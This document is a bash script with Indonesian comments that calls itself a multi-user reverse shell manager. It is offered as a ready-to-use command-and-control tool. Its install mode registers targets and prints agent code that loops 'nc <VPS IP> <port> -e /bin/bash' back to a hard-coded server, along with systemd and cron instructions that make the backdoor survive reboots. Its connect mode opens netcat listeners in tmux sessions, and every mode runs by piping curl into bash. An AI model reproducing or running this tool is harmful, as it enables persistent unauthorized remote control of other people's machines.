#!/usr/bin/env bash
#
# =========================================================
#  MULTI-USER REVERSE SHELL MANAGER (Proof-of-Concept)
# =========================================================
#  Modes:
#   1) INSTALL : X="secretKey" bash -c "$(curl -fsSL http://IP_VPS/script.sh)"
#   2) CONNECT : S="secretKey" bash -c "$(curl -fsSL http://IP_VPS/script.sh)"
#   3) LIST    : LIST=1 bash -c "$(curl -fsSL http://IP_VPS/script.sh)"
#   4) KILL    : K="secretKey" bash -c "$(curl -fsSL http://IP_VPS/script.sh)"
# =========================================================

# ----------------------------
# 1) Konfigurasi
# ----------------------------
DB_FILE="/tmp/multi_reverse_db.csv"
VPS_IP="45.76.182.111"    # Ganti dengan IP/domain VPS Anda
PORT_MIN=30000
PORT_MAX=40000

# Pastikan tool yang diperlukan terinstall di VPS:
#  - netcat (nc) versi "tradisional" (mendukung -e) atau ncat
#  - tmux
#  - (opsional) date, grep, awk, sed

# ----------------------------
# 2) Fungsi Pembantu
# ----------------------------

generate_port() {
  # Generate port random di rentang [PORT_MIN, PORT_MAX]
  shuf -i ${PORT_MIN}-${PORT_MAX} -n 1
}

timestamp_now() {
  # Format timestamp, misalnya "2025-02-03 10:15:30"
  date "+%Y-%m-%d %H:%M:%S"
}

init_db() {
  # Buat file DB jika belum ada
  if [ ! -f "$DB_FILE" ]; then
    touch "$DB_FILE"
  fi
}

save_record() {
  # Param: $1=key, $2=targetIP, $3=port, $4=status, $5=pid
  # Format CSV: key, IP, port, status, pid, createdAt
  local createdAt
  createdAt="$(timestamp_now)"
  echo "$1,$2,$3,$4,$5,$createdAt" >> "$DB_FILE"
}

update_record() {
  # Param: $1=key, $2=fieldIndex, $3=newValue
  # Field index (1=key, 2=IP, 3=port, 4=status, 5=pid, 6=createdAt)
  local key="$1"
  local fieldIndex="$2"
  local newValue="$3"

  if [ ! -f "$DB_FILE" ]; then
    echo "[ERROR] DB file not found."
    return 1
  fi

  local escapedKey
  escapedKey="$(echo "$key" | sed 's/[]\/$*.^|[]/\\&/g')"
  local escapedValue
  escapedValue="$(echo "$newValue" | sed 's/[]\/$*.^|[]/\\&/g')"

  # Gunakan awk untuk update kolom CSV
  awk -F, -v k="$key" -v f="$fieldIndex" -v val="$escapedValue" 'BEGIN {OFS=","} {
    if ($1 == k) {
      $f = val
    }
    print $0
  }' "$DB_FILE" > "${DB_FILE}.tmp" && mv "${DB_FILE}.tmp" "$DB_FILE"
}

find_record_by_key() {
  local key="$1"
  if [ ! -f "$DB_FILE" ]; then
    return
  fi
  grep "^${key}," "$DB_FILE" | tail -n 1
}

# Mendapatkan data field spesifik dari record CSV
get_field() {
  local record="$1"
  local index="$2"
  echo "$record" | cut -d',' -f "$index"
}

# Cek apakah tmux session dengan nama tertentu sudah ada
tmux_session_exists() {
  local sessionName="$1"
  tmux ls 2>/dev/null | grep -q "^${sessionName}:"
}

# ----------------------------
# 3) Mode: INSTALL
# ----------------------------
mode_install() {
  local key="$1"
  echo "[INFO] === MODE INSTALL: Key=$key ==="

  # 3a. Dapatkan IP publik/target
  local targetIP
  targetIP="$(curl -s ifconfig.me || echo "UNKNOWN_IP")"

  # 3b. Inisialisasi DB & Cek jika key sudah ada
  init_db
  local existing
  existing="$(find_record_by_key "$key")"
  if [ -n "$existing" ]; then
    echo "[WARN] Key '$key' sudah ada di database. Akan overwrite / gunakan data lama."
  fi

  # 3c. Generate port untuk key ini
  local assignedPort
  assignedPort="$(generate_port)"

  # 3d. Simpan data: key, IP, port, status=STOPPED, pid=-, createdAt
  if [ -n "$existing" ]; then
    # update port, ip, status, pid
    update_record "$key" 2 "$targetIP"      # IP
    update_record "$key" 3 "$assignedPort"  # Port
    update_record "$key" 4 "STOPPED"        # status
    update_record "$key" 5 "-"              # pid
  else
    save_record "$key" "$targetIP" "$assignedPort" "STOPPED" "-"
  fi

  # 3e. Tampilkan pesan sukses & agen
  cat <<EOF
[INFO] Berhasil mendaftarkan Key='$key' dengan IP='$targetIP'.
[INFO] Port assigned = $assignedPort

========================================================
=== PETUNJUK AGENT SEDERHANA (TIDAK PERMANEN) ===
Berikut contoh agen yang dapat Anda jalankan di sisi target
(misal: /tmp/agent.sh):

-------------------------------------------------
#!/usr/bin/env bash
while true; do
  # Tunggu 10 detik sebelum mencoba konek
  sleep 10
  nc ${VPS_IP} ${assignedPort} -e /bin/bash
done
-------------------------------------------------

1. Simpan skrip di /tmp/agent.sh
2. chmod +x /tmp/agent.sh
3. Jalankan: nohup /tmp/agent.sh &

Setiap kali VPS buka listener (CONNECT Mode) untuk Key=$key,
agen di target akan menelpon balik ke port ${assignedPort}.

========================================================
=== PETUNJUK INSTALASI PERMANEN (SYSTEMD) ===
Agar agen selalu berjalan (dan restart otomatis), Anda bisa
membuat service systemd di target (butuh hak akses root).

1) Buat file agen, misal: /usr/local/bin/revagent_${key}.sh

   #-----------------------------------
   #!/usr/bin/env bash
   while true; do
     sleep 10
     nc ${VPS_IP} ${assignedPort} -e /bin/bash
   done
   #-----------------------------------

   Beri izin eksekusi:
   chmod +x /usr/local/bin/revagent_${key}.sh

2) Buat file service, misal: /etc/systemd/system/revagent_${key}.service

   #-----------------------------------
   [Unit]
   Description=Reverse Shell Agent (Key=${key})
   After=network.target

   [Service]
   ExecStart=/usr/local/bin/revagent_${key}.sh
   Restart=always
   RestartSec=5

   [Install]
   WantedBy=multi-user.target
   #-----------------------------------

3) Aktifkan dan mulai service:
   systemctl daemon-reload
   systemctl enable revagent_${key}.service
   systemctl start revagent_${key}.service

Dengan demikian, agen akan:
  - Otomatis start saat boot.
  - Jika agen mati, systemd akan restart.
  - Terus mencoba reverse shell ke ${VPS_IP}:${assignedPort}.

========================================================
=== ALTERNATIF CRON (jika tidak punya akses root) ===
   * Buat agen seperti biasa (point #1).
   * Edit crontab: crontab -e
   * Tambahkan: 
       @reboot /usr/local/bin/revagent_${key}.sh &
   * Agen akan aktif setiap kali server menyala ulang
     (namun jika agen mati di tengah jalan, cron tidak
     otomatis me-restart, kecuali ditambahkan jadwal
     per menit - perlu hati-hati agar tidak double-process).
========================================================
EOF
}

# ----------------------------
# 4) Mode: CONNECT
# ----------------------------
mode_connect() {
  local key="$1"
  echo "[INFO] === MODE CONNECT: Key=$key ==="

  init_db
  local record
  record="$(find_record_by_key "$key")"
  if [ -z "$record" ]; then
    echo "[ERROR] Key '$key' tidak ditemukan di database."
    exit 1
  fi

  local targetIP port status pid
  targetIP="$(get_field "$record" 2)"
  port="$(get_field "$record" 3)"
  status="$(get_field "$record" 4)"
  pid="$(get_field "$record" 5)"

  echo "[INFO] -> targetIP=$targetIP ; assignedPort=$port ; status=$status"

  local sessionName="rs_${key}"
  if tmux_session_exists "$sessionName"; then
    echo "[WARN] Session '$sessionName' sudah berjalan. Mungkin listener sudah aktif."
    echo "       Silakan KILL dulu jika ingin restart, atau"
    echo "       tmux attach -t $sessionName  (untuk melihat sesi)."
    exit 0
  fi

  echo "[INFO] Membuka listener (nc) di port $port (session tmux=$sessionName)"
  tmux new -d -s "$sessionName" "nc -lvkp $port"

  update_record "$key" 4 "LISTENING"
  update_record "$key" 5 "$sessionName"

  echo "[INFO] Listener aktif. Pastikan agen di target berjalan."
  echo "[INFO] Untuk masuk ke shell: tmux attach -t $sessionName"
  echo "[INFO] Lalu detach: Ctrl+B D (atau Ctrl+AD)."
}

# ----------------------------
# 5) Mode: LIST
# ----------------------------
mode_list() {
  echo "=== DAFTAR KEY DI DATABASE ==="
  init_db

  if [ ! -s "$DB_FILE" ]; then
    echo "[INFO] Belum ada data. (DB kosong)"
    exit 0
  fi

  echo "KEY, IP, PORT, STATUS, PID/TMUX_SESSION, CREATED_AT"
  cat "$DB_FILE"
}

# ----------------------------
# 6) Mode: KILL
# ----------------------------
mode_kill() {
  local key="$1"
  echo "[INFO] === MODE KILL: Key=$key ==="

  init_db
  local record
  record="$(find_record_by_key "$key")"
  if [ -z "$record" ]; then
    echo "[ERROR] Key '$key' tidak ditemukan di database."
    exit 1
  fi

  local status pid
  status="$(get_field "$record" 4)"
  pid="$(get_field "$record" 5)"

  if [ "$status" != "LISTENING" ]; then
    echo "[WARN] Status key='$key' bukan LISTENING. status=$status"
    echo "       Mungkin listener sudah mati atau belum dijalankan."
    exit 0
  fi

  local sessionName="$pid"
  if tmux_session_exists "$sessionName"; then
    echo "[INFO] Menutup tmux session '$sessionName' ..."
    tmux kill-session -t "$sessionName" 2>/dev/null
    update_record "$key" 4 "STOPPED"
    update_record "$key" 5 "-"
    echo "[INFO] Listener untuk key=$key berhasil dimatikan."
  else
    echo "[WARN] Tmux session '$sessionName' tidak ditemukan. Update status ke STOPPED."
    update_record "$key" 4 "STOPPED"
    update_record "$key" 5 "-"
  fi
}

# ----------------------------
# 7) MAIN
# ----------------------------
main() {
  if [ -n "$X" ]; then
    # INSTALL
    mode_install "$X"
  elif [ -n "$S" ]; then
    # CONNECT
    mode_connect "$S"
  elif [ -n "$LIST" ]; then
    # LIST
    mode_list
  elif [ -n "$K" ]; then
    # KILL
    mode_kill "$K"
  else
    cat <<EOF
[Usage]:
  # 1) Install/Daftar Key di Target:
     X="mySecretKey" bash -c "\$(curl -fsSL http://${VPS_IP}/script.sh)"
  
  # 2) Jalankan Listener di VPS (Connect):
     S="mySecretKey" bash -c "\$(curl -fsSL http://${VPS_IP}/script.sh)"
  
  # 3) List semua key & status:
     LIST=1 bash -c "\$(curl -fsSL http://${VPS_IP}/script.sh)"
  
  # 4) Kill/Matikan listener tertentu:
     K="mySecretKey" bash -c "\$(curl -fsSL http://${VPS_IP}/script.sh)"
EOF
  fi
}

main "$@"
